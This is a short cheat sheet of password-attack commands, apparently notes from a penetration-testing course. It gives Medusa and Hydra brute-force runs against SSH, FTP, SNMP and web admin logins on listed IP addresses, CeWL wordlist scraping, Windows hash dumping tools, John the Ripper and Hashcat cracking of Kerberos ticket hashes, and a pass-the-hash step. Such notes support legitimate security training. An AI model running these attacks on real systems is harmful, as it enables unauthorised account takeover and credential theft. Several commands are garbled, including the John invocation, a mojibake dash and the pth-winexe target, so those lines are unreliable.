# Password attacks

#### `usr/share/wordlists`

### Brute force

#### Medusa

```text
medusa -h 10.11.1.219 -u admin -P password.txt -M http -m DIR:/admin -T 10
```

#### Hydra

```text
hydra -P password.txt -v 10.11.1.210 snmp
hydra -l admin -P password.txt -v 122.168.31.219 ftp
hydra -l root -P password.txt 10.11.1.219 ssh
hydra -L users.txt -P password.txt 10.10.219.253 www-get /admin
```

### Cewl - scraping webpages

```text
cewl www. megacorpone.com -m 6 -w megacorp-cewl.txt
```

### Hash attacks

Exporting hashes: PWDump, Fgdump, Windows Credential Editor \(WCE.exe\)

Cracking hashes: John the Ripper

Raw: `john 127.0.0.1 pwdump (slow)`

With wordlist: `john â€“wordlist=/usr/share/wordlists/rockyou.txt`

On Linux: combine the passwd and shadow files prior to cracking

`unshadow passwd-file.txt shadow-file.txt`

### Hashcat

Windows AD hashes

```text
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### Passing the hash \(Windows\)

Create environment variable SMBHASH, containing hash we want to pass

`export SMBHASH=hashvalue`

`Use pth-winexe to authenticate: pth-winexe -U administrator% //10.11.0.1.76.cmd`

